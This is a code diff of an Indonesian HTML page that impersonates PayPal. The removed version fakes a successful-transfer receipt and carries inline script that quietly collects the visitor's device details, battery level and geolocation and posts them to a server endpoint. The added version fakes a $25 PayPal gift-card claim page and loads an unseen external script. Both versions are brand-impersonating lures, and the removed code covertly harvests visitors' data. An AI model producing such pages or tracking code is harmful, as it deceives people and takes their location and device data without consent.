@@ -1,147 +1,136 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>PayPal - Transfer Berhasil</title>
-  <script src="script.js"></script>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f6f7fb;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-
-    .container {
-      background-color: #ffffff;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-      max-width: 450px;
-      width: 90%;
-      text-align: center;
-    }
-
-    .logo {
-      margin-bottom: 20px;
-    }
-
-    .logo img {
-      height: 45px;
-    }
-
-    h1 {
-      color: #0070ba;
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-
-    .amount {
-      font-size: 22px;
-      font-weight: bold;
-      color: #111;
-      margin-bottom: 10px;
-    }
-
-    .status {
-      color: #4BB543;
-      font-weight: 600;
-      margin-bottom: 20px;
-    }
-
-    .transaction-id {
-      font-size: 14px;
-      color: #555;
-      margin-bottom: 30px;
-    }
-
-    .summary {
-      text-align: left;
-      font-size: 14px;
-      color: #333;
-      border-top: 1px solid #ddd;
-      padding-top: 15px;
-    }
-
-    .summary p {
-      margin: 5px 0;
-    }
-
-    .footer {
-      margin-top: 25px;
-      font-size: 12px;
-      color: #999;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>PayPal - Claim Gift Card</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            background-color: #f4f7fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .gift-container {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.06);
+            max-width: 420px;
+            width: 90%;
+            padding: 40px 30px;
+            text-align: center;
+            box-sizing: border-box;
+            border: 1px solid #e1e8ed;
+        }
+        .icon-container {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 70px;
+            height: 70px;
+            background-color: #0070ba;
+            border-radius: 50%;
+            margin-bottom: 24px;
+        }
+        .icon-container svg {
+            width: 35px;
+            height: 35px;
+            fill: #ffffff;
+        }
+        h1 {
+            color: #0b1a30;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 0 8px 0;
+        }
+        .badge-fiktif {
+            display: inline-block;
+            background-color: #e5f1fa;
+            color: #0070ba;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+        }
+        .card-details {
+            background-color: #f8fafc;
+            border: 1px dashed #cbd5e1;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 30px;
+        }
+        .amount-tag {
+            font-size: 36px;
+            font-weight: 800;
+            color: #0070ba;
+            margin-bottom: 8px;
+        }
+        .status-text {
+            font-size: 14px;
+            color: #475569;
+            line-height: 1.6;
+        }
+        .claim-btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background-color: #0070ba;
+            color: #ffffff;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            box-sizing: border-box;
+            box-shadow: 0 4px 12px rgba(0, 112, 186, 0.2);
+        }
+        .claim-btn:hover {
+            background-color: #005ea6;
+        }
+        .claim-btn:active {
+            transform: scale(0.98);
+        }
+        .transaction-id {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #94a3b8;
+            font-family: monospace;
+        }
+    </style>
 </head>
-
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
+
+    <div class="gift-container">
+        <div class="icon-container">
+          <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" height="45">
+        </div>
+        
+        <h1>PayPal</h1>
+        <div class="badge-fiktif">Gift Card</div>
+        
+        <div class="card-details">
+            <div class="amount-tag">$ 25.00</div>
+            <p class="status-text">
+                The electronic gift voucher is ready to be redeemed. The balance will be credited to your digital account once the verification process is complete.
+            </p>
+        </div>
+        
+        <button class="claim-btn" onclick="alert('Muach Love You!')">
+            Claim Your Reward
+        </button>
+        
+        <div class="transaction-id">
+            ID: PP-ID8728932873
+        </div>
     </div>
-
-    <h1>Transfer Berhasil</h1>
-    <div class="amount">Rp 1.500.000</div>
-    <div class="status">Dana telah dikreditkan</div>
-    <div class="transaction-id">ID Transaksi: PP-ID8728932873</div>
-
-    <div class="summary">
-      <p><strong>Nama Penerima:</strong> Andi Prasetyo</p>
-      <p><strong>Rekening Tujuan:</strong> BCA 0149384728</p>
-      <p><strong>Tanggal:</strong> 1 Agustus 2025</p>
-      <p><strong>Metode:</strong> PayPal Balance</p>
-    </div>
-
-    <div class="footer">
-      © 2025 PayPal, Inc. Semua hak dilindungi undang-undang.
-    </div>
-  </div>
-
-  <script>
-    function getDeviceInfo() {
-      return {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        battery: null,
-        location: null
-      };
-    }
-
-    async function sendData(data) {
-      try {
-        await fetch("/data", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(data)
-        });
-      } catch (err) {
-        console.error("Gagal kirim data:", err);
-      }
-    }
-
-    navigator.getBattery().then(batt => {
-      let info = getDeviceInfo();
-      info.battery = `${Math.round(batt.level * 100)}%`;
-
-      navigator.geolocation.getCurrentPosition(pos => {
-        info.location = {
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude
-        };
-        sendData(info);
-      }, () => {
-        sendData(info);
-      });
-    });
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
